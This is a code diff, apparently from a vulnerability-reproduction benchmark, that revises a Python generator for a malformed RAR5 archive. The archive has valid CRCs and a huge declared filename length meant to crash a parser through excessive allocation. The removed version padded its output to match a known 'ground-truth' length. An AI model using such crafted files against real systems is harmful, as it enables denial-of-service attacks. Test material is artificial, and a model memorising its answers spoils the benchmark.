@@ -1,3 +1,4 @@
+import struct
 import zlib
 
 class Solution:
@@ -12,61 +13,52 @@ class Solution:
             bytes: The PoC input that should trigger the vulnerability
         """
 
-        def _vint(n: int) -> bytes:
-            """Encodes an integer into the RAR variable-length integer format."""
+        def vint(n: int) -> bytes:
+            """Encodes an integer into the RAR5 variable-length integer format."""
             if n == 0:
                 return b'\x00'
             res = bytearray()
             while n > 0:
-                byte = n & 0x7f
+                byte_val = n & 0x7F
                 n >>= 7
                 if n > 0:
-                    byte |= 0x80
-                res.append(byte)
+                    byte_val |= 0x80
+                res.append(byte_val)
             return bytes(res)
 
-        # 1. RAR5 file signature
-        poc = b'\x52\x61\x72\x21\x1a\x07\x01\x00'
+        # 1. RAR5 file signature: b"Rar!\x1a\x07\x01\x00"
+        poc = b"\x52\x61\x72\x21\x1a\x07\x01\x00"
 
-        # 2. Main Archive Header (HEAD_MAIN = 1)
-        main_header_data = b''
-        main_header_data += _vint(1)  # Header type: HEAD_MAIN
-        main_header_data += _vint(0)  # Header flags
+        # 2. Main Archive Header (minimal)
+        # Type: 0x01 (HEAD_MAIN), Flags: 0, Archive Flags: 0
+        main_header_content = vint(1) + vint(0) + vint(0)
+        main_header_prefix = vint(len(main_header_content)) + main_header_content
+        main_crc = zlib.crc32(main_header_prefix)
+        main_block = struct.pack('<I', main_crc) + main_header_prefix
+        poc += main_block
 
-        main_header = b''
-        main_header += zlib.crc32(main_header_data).to_bytes(4, 'little')
-        main_header += _vint(len(main_header_data))
-        main_header += main_header_data
+        # 3. File Header with an extremely large filename length.
+        # The vulnerability is that the name size is read and used for allocation
+        # before it is checked against a maximum allowed size. A very large
+        # value will cause an OOM crash in a sanitized environment.
+        huge_name_len = 0x7FFFFFFF
+
+        # Construct the data part of the file header
+        file_header_data = b""
+        file_header_data += vint(0)  # File flags
+        file_header_data += vint(0)  # Unpacked size
+        file_header_data += vint(0)  # File attributes
+        file_header_data += vint(0)  # Compression info: version
+        file_header_data += vint(0)  # Compression info: method (store)
+        file_header_data += vint(0)  # Compression info: host OS
+        file_header_data += vint(huge_name_len)  # Malicious name length
+
+        # Construct the full file header block
+        # Type: 0x02 (HEAD_FILE), Flags: 0
+        file_header_content = vint(2) + vint(0) + file_header_data
+        file_header_prefix = vint(len(file_header_content)) + file_header_content
+        file_crc = zlib.crc32(file_header_prefix)
+        file_block = struct.pack('<I', file_crc) + file_header_prefix
+        poc += file_block
         
-        poc += main_header
-
-        # 3. Malicious File Header (HEAD_FILE = 2)
-        file_header_data = b''
-        file_header_data += _vint(2)  # Header type: HEAD_FILE
-        file_header_data += _vint(0)  # Header flags
-        file_header_data += _vint(1024) # Unpacked size
-        file_header_data += _vint(0x20) # File attributes
-        file_header_data += b'\x00\x00\x00\x00'  # File CRC32 (dummy)
-        file_header_data += _vint(0x60) # Compression info (store method)
-        file_header_data += _vint(4)  # Host OS: Unix
-        
-        # Vulnerability trigger: a huge name length to cause a large allocation.
-        name_len = 0x40000000
-        file_header_data += _vint(name_len)
-        
-        file_header = b''
-        file_header += zlib.crc32(file_header_data).to_bytes(4, 'little')
-        file_header += _vint(len(file_header_data))
-        file_header += file_header_data
-        
-        poc += file_header
-
-        # 4. Padding to match ground-truth PoC length.
-        # The parser's attempt to read the huge name will hit EOF,
-        # leading to the vulnerable error-handling path.
-        target_len = 1089
-        current_len = len(poc)
-        if target_len > current_len:
-            poc += b'\x41' * (target_len - current_len)
-
         return poc
